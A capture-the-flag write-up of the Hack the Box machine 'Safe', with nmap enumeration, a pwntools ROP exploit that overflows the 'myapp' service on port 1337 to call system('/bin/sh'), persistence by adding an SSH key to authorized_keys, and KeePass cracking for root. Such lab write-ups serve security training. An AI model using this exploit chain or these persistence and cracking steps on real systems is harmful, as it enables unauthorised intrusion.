---
title: Safe -- Hackthebox Writeup  
published: true
---
# [](#header-1)Safe -- Hack the Box write-up

**Safe** is a _retired_ machine from Hack the Box. It is rated as a easy machine, however, the user own difficulty is rated medium-hard (probably for containing a ROP exploitable binary, uncommon in this platform).
## [](#header-2)Enumeration

First, let's start running a quick scan to discover which ports are open.
`nmap -T5 -n -Pn -oG fastscan -p- 10.10.10.147`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 16:00 EDT                                                                                                                                 
Warning: 10.10.10.147 giving up on port because retransmission cap hit (2).                                                                                                                                     
Nmap scan report for 10.10.10.147                                                                                                                                                                               
Host is up (0.049s latency).                                                                                                                                                                                    
Not shown: 65532 closed ports                                                                                                                                                                                   
PORT     STATE SERVICE                                                                                                                                                                                          
22/tcp   open  ssh                                                                                                                                                                                              
80/tcp   open  http                                                                                                                                                                                             
1337/tcp open  waste                                                                                                                                                                                            
                                                                                                                                                                                                                
Nmap done: 1 IP address (1 host up) scanned in 113.76 seconds   
```
Now, let's look more in depth what is the service associated with each port `nmap -T5 -n -p 22,80,1337 -sC -sV -oG indepthscan 10.10.10.147`:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 17:17 EDT
Nmap scan report for 10.10.10.147
Host is up (0.052s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     17:30:31 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|   DNSVersionBindReqTCP:
|     17:30:26 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|   GenericLines:
|     17:30:15 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back?
|   GetRequest:
|     17:30:21 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions:
|     17:30:21 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help:
|     17:30:36 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? HELP
|   NULL:
|     17:30:15 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|   RPCCheck:
|     17:30:21 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|   RTSPRequest:
|     17:30:21 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq:
|     17:30:36 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back?
|   TLSSessionReq, TerminalServerCookie:
|     17:30:37 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|_    What do you want me to echo back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.80%I=7%D=3/19%Time=5E73E16E%P=x86_64-pc-linux-gnu%r(NU
SF:LL,3E,"\x2017:30:15\x20up\x20\x203:13,\x20\x200\x20users,\x20\x20load\x
SF:20average:\x200\.00,\x200\.00,\x200\.00\n")%r(GenericLines,63,"\x2017:3
SF:0:15\x20up\x20\x203:13,\x20\x200\x20users,\x20\x20load\x20average:\x200
SF:\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20ec
SF:ho\x20back\?\x20\r\n")%r(GetRequest,71,"\x2017:30:21\x20up\x20\x203:13,
SF:\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.0
SF:0\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET\x20
SF:/\x20HTTP/1\.0\r\n")%r(HTTPOptions,75,"\x2017:30:21\x20up\x20\x203:13,\
SF:x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00
SF:\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIONS\
SF:x20/\x20HTTP/1\.0\r\n")%r(RTSPRequest,75,"\x2017:30:21\x20up\x20\x203:1
SF:3,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\
SF:.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIO
SF:NS\x20/\x20RTSP/1\.0\r\n")%r(RPCCheck,3E,"\x2017:30:21\x20up\x20\x203:1
SF:3,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\
SF:.00\n")%r(DNSVersionBindReqTCP,3E,"\x2017:30:26\x20up\x20\x203:13,\x20\
SF:x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")
SF:%r(DNSStatusRequestTCP,3E,"\x2017:30:31\x20up\x20\x203:13,\x20\x200\x20
SF:users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")%r(Help,
SF:67,"\x2017:30:36\x20up\x20\x203:13,\x20\x200\x20users,\x20\x20load\x20a
SF:verage:\x200\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me
SF:\x20to\x20echo\x20back\?\x20HELP\r\n")%r(SSLSessionReq,64,"\x2017:30:36
SF:\x20up\x20\x203:13,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00
SF:,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x
SF:20back\?\x20\x16\x03\n")%r(TerminalServerCookie,63,"\x2017:30:37\x20up\
SF:x20\x203:13,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\
SF:.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\
SF:?\x20\x03\n")%r(TLSSessionReq,64,"\x2017:30:37\x20up\x20\x203:13,\x20\x
SF:200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n\nW
SF:hat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\x16\x03\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.54 seconds
```

Hmmm... Looks like we have a l33t port open. We'll see what is running there later. 
By now, time to start my reconaissance part.

## [](#header-2)Recon

First, let's check if any of the running services can be exploited remotely.

![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/searchsploit.PNG)

Nothing interesting so far. Better to see what is running under port 80.
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/port80.PNG)

Hurray, a boring **Apache** default page... Fuzzing does not give us any interesing information either.
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/fuzz.PNG)

However, reviewing the page source code gives us finally some valuable info! It seems that an app called 'myapp' (duh) is running under port 1337. 
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/fuzz.PNG)

Also, we can download it by browsing into http://10.10.10.147/myapp. `curl -v -XGET http://10.10.10.147/myapp -o myapp` 
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/download_bin.PNG)

It smells like a challenge similar to the BOF from the OSCP :). We need to confirm it sending a large message to the program. 
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/overflow.PNG)

Yep, we go the buffer overflow. Let's run `checksec` to see if it has any security measures enabled.
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/checksec.PNG)

Yikes, **NX enabled** (non-executable stack). We can not simply put our shellcode in the stack to jump and execute it. 

After opening the binary with **Ghidra** and looking into the decompiled code, we can ensure that there exists the buffer overflow as only **112 characters** are reserved for the string.

![](https://github.com/kikoas1995/kikoas1995.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/decompiledC.PNG)
Also, the function system is called, which can allow us to execute remote code via ROP. Obviously, the argument passed to this function is not a shell. It is actually the _uptime_ binary:
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/uptime_rdi.PNG)
![](uptime exec)

## [](#header-2)Exploitation

It is time to use some binary exploitation skills. 
We need a way to put `/bin/sh` onto the _rdi_ register and then call the local function `system()`. 
> Note: _rdi_ register always acts as the first argument for the function that will be called. In x86 binaries, arguments were passed pushing registers into the stack.  

Using `objdump` we find a `system()` call in address 0x401040.
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/system_addr.PNG)

Now I will use `gef` to inspect the source code main and test functions.
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/info_functions.PNG)
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/disas main tests.PNG)

Apparently, when the `test()` function ends, jumps to the memory address stored in the r13 register, so we need to put there the `system()` call we addressed before. In order to do this we need to look for a ROP gadget where we can store the system call. I will simplify this process using **ropper**:
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/ropper.PNG)

Looks like `0x0000000000401206` would work for us.

We are almost finishing! We need to overwrite the stack base pointer with our shell, which will be done with the _pattern create_ and _pattern offset_ utilities of `gef`: 

![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/pattern_create.PNG)
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/pattern_offset.PNG)
So the string `oaaaaaaa` will be in our case a `/bin/sh\x00`. Time to develope our own exploit with the help of **pwntools**.

```python
from pwn import *

p = remote('10.10.10.147', 1337) 
buffer = "A"*112 + "/bin/sh\x00"   # rbp = /bin/sh\x00
buffer += p64(0x401206)            # ROP gadget addr
buffer += p64(0x401040)            # r13 = system() call addr 
buffer += p64(0x000000)            # r14 = blank
buffer += p64(0x000000)            # r15 = blank
buffer += p64(0x401152)            # init() addr

print("Safe(10.10.10.147) HTB machine remote exploit") 
p.sendline(buffer)
p.interactive()
```
It worked!!! :D
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/remoteshell.PNG)

As the SSH service is enabled, I can add my public key to the authorized_keys file on the target:
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/ssh-keygen.PNG)
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/sshshell.PNG)

## [](#header-2)Privilege Escalation

Root is easier than user, you'll see. First, Copy every file from the user folder.

![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/scp.PNG)

Now let's crack the keepass database. We have a list of images which can be a hint that the database key could be one of them. However, in addition to the file, it is protected with a password, so I will use a small wordlist for each image  used to decrypt de database.
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/crack_keepass.PNG)

It seems that the IMG_0547.JPG, along with the password 'bullshit', is our entrance to root :).
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/root_pwd.PNG)

Performing a su root with the password retrieved leads us to our beloved root shell. Reading the flags from here is trivial.
![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/flags.PNG)

